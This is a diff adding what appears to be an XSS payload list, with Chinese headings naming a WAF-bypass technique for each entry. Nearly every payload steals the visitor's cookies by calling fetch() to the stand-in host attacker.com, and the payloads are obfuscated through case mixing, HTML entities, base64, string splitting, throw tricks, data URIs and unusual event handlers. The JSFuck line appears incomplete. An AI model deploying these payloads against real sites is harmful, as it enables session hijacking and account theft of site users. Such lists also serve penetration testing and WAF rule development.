@@ -1,0 +1,38 @@
+# XSS WAF 绕过 - 大小写混淆绕过标签过滤
+<ScRiPt>fetch('http://attacker.com/'+document.cookie)</sCrIpT>
+# XSS WAF 绕过 - 空格替换 (0x0C 换页符绕过空格检测)
+<svg%0Conload=fetch('http://attacker.com/'+document.cookie)>
+# XSS WAF 绕过 - 反斜杠替代空格
+<img/src=x/onerror=fetch('http://attacker.com/'+document.cookie)>
+# XSS WAF 绕过 - HTML 实体编码混淆 (十进制)
+<svg onload=&#102&#101&#116&#099&#104&#040&#039&#104&#116&#116&#112&#058&#047&#047&#097&#116&#116&#097&#099&#107&#101&#114&#046&#099&#111&#109&#047&#039&#043&#100&#111&#099&#117&#109&#101&#110&#116&#046&#099&#111&#111&#107&#105&#101&#041>
+# XSS WAF 绕过 - null 字节注入绕过 onxxx 过滤
+<img src=x onerror\x00=fetch('http://attacker.com/'+document.cookie)>
+# XSS WAF 绕过 - 反引号绕过圆括号过滤
+<script>fetch`http://attacker.com/${document.cookie}`</script>
+# XSS WAF 绕过 - 字符串拼接绕过关键字黑名单
+<script>eval('fetc'+'h("http://attacker.com/"+docu'+'ment.cookie)')</script>
+# XSS WAF 绕过 - atob base64 编码绕过关键词
+<script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vJytkb2N1bWVudC5jb29raWUp'))</script>
+# XSS WAF 绕过 - window 下标访问绕过属性黑名单
+<script>window['fetch']('http://attacker.com/'+document['cookie'])</script>
+# XSS WAF 绕过 - throw 绕过圆括号过滤
+<script>{onerror=fetch}throw'http://attacker.com/'+document.cookie</script>
+# XSS WAF 绕过 - 模板字符串绕过引号过滤
+<svg/onload=fetch(`http://attacker.com/${document.cookie}`)>
+# XSS WAF 绕过 - JSFuck 编码绕过 WAF (仅 +!()[] 字符)
+<script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[]</script>
+# XSS WAF 绕过 - Unicode 编码绕过 (< 和 >)
+\u003cscript\u003efetch('http://attacker.com/'+document.cookie)\u003c/script\u003e
+# XSS WAF 绕过 - data:text/html base64 绕过
+<object data="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovL2F0dGFja2VyLmNvbS8nK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4=">
+# XSS WAF 绕过 - 无效属性混淆 + 真实 onload
+<svg/onrandom=random onload=fetch('http://attacker.com/'+document.cookie)>
+# XSS WAF 绕过 - SVG animate 事件绕过过滤
+<svg><animate onbegin=fetch('http://attacker.com/'+document.cookie) attributeName=x dur=1s>
+# XSS WAF 绕过 - details 标签 ontoggle 事件
+<details open ontoggle=fetch('http://attacker.com/'+document.cookie)>
+# XSS WAF 绕过 - marquee 标签 onstart 事件
+<marquee onstart=fetch('http://attacker.com/'+document.cookie)>
+# XSS WAF 绕过 - 分号分隔无空格
+<script>fetch('http://attacker.com/'+document.cookie)</script><script>void(0)</script>
